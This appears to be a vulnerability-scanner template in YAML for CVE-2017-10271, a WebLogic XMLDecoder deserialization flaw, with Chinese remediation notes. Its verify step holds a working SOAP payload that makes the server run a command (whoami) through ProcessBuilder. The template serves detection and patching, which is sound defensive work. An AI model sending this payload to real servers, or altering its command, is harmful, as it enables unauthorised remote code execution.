app: WebLogic
query: app:"weblogic"
meta:
  name: CVE-2017-10271 WebLogic XMLDecoder反序列化漏洞
  level: 4
  tags:
    - remote_code_execution
  description: |
    CVE-2017-10271漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。
  homepage: https://www.oracle.com/java/weblogic/
  author: Administrator
  references: https://blog.csdn.net/weixin_45694388/article/details/118601788
  solution: "1.临时解决方案\n        根据攻击者利用POC分析发现所利用的为wls-wsat组件的CoordinatorPortType接口，若Weblogic服务器集群中未应用此组件，建议临时备份后将此组件删除，当形               成防护能力后，再进行恢复。\n        根据实际环境路径，删除WebLogic wls-wsat组件：\n        rm -f   /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war\n        rm -f   /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war\n        rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat\n        删除后重启Weblogic域控制器服务:\n        DOMAIN_NAME/bin/stopWeblogic.sh           #停止服务\n         DOMAIN_NAME/bin/startManagedWebLogic.sh    #启动服务\n        删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面。\n        \n    2.官方补丁修复\n        前往Oracle官网下载10月份所提供的安全补丁\n        http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html\n        升级过程可参考：\n        http://blog.csdn.net/qqlifu/article/details/49423839"
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /wls-wsat/CoordinatorPortType
            redirect: true
            header:
              - Content-Type: text/xml;charset=UTF-8
              - { }
            params: |-
              <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                    <soapenv:Header>
                      <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                        <java>
                          <void class="java.lang.ProcessBuilder">
                            <array class="java.lang.String" length="1">
                              <void index="0">
                                <string>/usr/bin/whoami</string>
                              </void>
                            </array>
                            <void method="start"/>
                          </void>
                        </java>
                      </work:WorkContext>
                    </soapenv:Header>
                    <soapenv:Body/>
                  </soapenv:Envelope>
          response:
            - name: body
              value: <faultstring>java.lang.ProcessBuilder
              type: contains
  create_at: "2022-05-25 10:20:32"
